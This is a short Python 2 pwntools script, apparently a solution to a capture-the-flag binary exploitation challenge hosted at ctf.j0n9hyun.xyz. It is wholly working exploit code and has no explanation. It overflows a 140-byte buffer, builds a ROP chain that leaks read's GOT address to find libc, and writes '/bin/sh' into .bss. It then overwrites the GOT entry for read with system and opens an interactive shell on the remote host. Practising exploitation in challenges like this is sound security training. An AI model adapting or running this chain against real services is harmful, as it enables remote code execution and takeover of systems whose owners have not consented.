from pwn import *

pppr=0x08048509
write_plt=0x08048340
read_plt=0x08048310
read_got=0x0804a00c
read_offset=0xd4350
system_offset=0x3a940
bss=0x0804a024
binsh="/bin/sh\x00"


p=remote('ctf.j0n9hyun.xyz','3021')

payload='a'*140
payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(read_got)+p32(4)
#find read addr
payload+=p32(read_plt)+p32(pppr)+p32(0)+p32(bss)+p32(len(binsh))
#write /bin/shy
payload+=p32(read_plt)+p32(pppr)+p32(0)+p32(read_got)+p32(4)
#overwrite read_got to system_addr
payload+=p32(read_plt)+"aaaa"+p32(bss)


p.sendline(payload)
read_addr=u32(p.recv(4))
libc=read_addr - read_offset
print "libc addr = "+hex(libc)
system_addr=libc + system_offset
print "system addr = "+hex(system_addr)
p.send(binsh)
p.sendline(p32(system_addr))
p.interactive()
p.close()